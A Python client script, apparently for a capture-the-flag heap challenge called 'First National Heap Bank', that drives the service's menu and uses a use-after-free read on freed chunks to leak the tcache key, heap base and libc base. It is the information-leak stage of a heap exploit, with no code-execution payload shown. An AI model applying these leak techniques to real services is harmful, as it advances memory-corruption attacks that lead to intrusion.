#!/usr/bin/env python3
"""Client for First National Heap Bank."""
import socket, struct, time, re, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else '10.10.0.4'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

class Bank:
    def __init__(self, host=HOST, port=PORT, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b''
        self.wait(b'ledger> ')

    def _fill(self):
        d = self.s.recv(65536)
        if not d:
            raise EOFError
        self.buf += d

    def wait(self, tok):
        while tok not in self.buf:
            self._fill()
        i = self.buf.index(tok)
        out = self.buf[:i+len(tok)]
        self.buf = self.buf[i+len(tok):]
        return out

    def send(self, d):
        if isinstance(d, str):
            d = d.encode()
        self.s.sendall(d)

    def sl(self, d):
        if isinstance(d, str):
            d = d.encode()
        self.s.sendall(d + b'\n')

    def open(self, slot, size, data=b''):
        if len(data) < size:
            data = data + b'A' * (size - len(data))
        assert len(data) == size, (len(data), size)
        self.sl('1')
        self.wait(b'account slot (0-15): ')
        self.sl(str(slot))
        self.wait(b'holder record size: ')
        self.sl(str(size))
        self.wait(b'holder details: ')
        self.send(data)
        # does it consume trailing newline?
        self.send(b'\n')
        return self.wait(b'ledger> ')

    def view(self, slot):
        self.sl('2')
        self.wait(b'account slot: ')
        self.sl(str(slot))
        head = self.wait(b'):\n')  # "statement (N bytes):\n"
        m = re.search(rb'statement \((\d+) bytes\)', head)
        if not m:
            raise RuntimeError('no size in %r' % head[:200])
        n = int(m.group(1))
        while len(self.buf) < n + 1:
            self._fill()
        data = self.buf[:n]
        self.buf = self.buf[n+1:]  # trailing newline
        self.wait(b'ledger> ')
        return data

    def amend(self, slot, data):
        self.sl('3')
        self.wait(b'account slot: ')
        self.sl(str(slot))
        self.wait(b'new holder details: ')
        self.send(data)
        self.send(b'\n')
        return self.wait(b'ledger> ')

    def close(self, slot):
        self.sl('4')
        self.wait(b'account slot: ')
        self.sl(str(slot))
        return self.wait(b'ledger> ')

    def rawview(self, slot):
        """send view request, return raw response until ledger prompt."""
        self.sl('2')
        self.wait(b'account slot: ')
        self.sl(str(slot))
        return self.wait(b'ledger> ')


def p64(x):
    return struct.pack('<Q', x & (2**64-1))

def u64(b):
    return struct.unpack('<Q', b[:8])[0]

if __name__ == '__main__':
    b = Bank()
    # heap leak: alloc 0x20, free, view tcache key
    print(b.open(0, 0x20, b'A'*0x20))
    print('close', b.close(0))
    d = b.view(0)
    print('freed 0x20 data:', d.hex())
    tcache_key = u64(d[8:16])
    print('tcache key  =', hex(tcache_key))
    print('heap base?  =', hex(tcache_key - 0x10))
    # libc leak
    print(b.open(1, 0x500, b'B'*0x500))
    print(b.close(1))
    d = b.view(1)
    fd = u64(d[:8]); bk = u64(d[8:16])
    print('unsorted fd =', hex(fd), 'bk =', hex(bk))
    print('candidate base 9.9 =', hex(fd - 0x1ecb80 - 0x60))
    print('candidate base 9.7 =', hex(fd - 0x1ebb80 - 0x60))
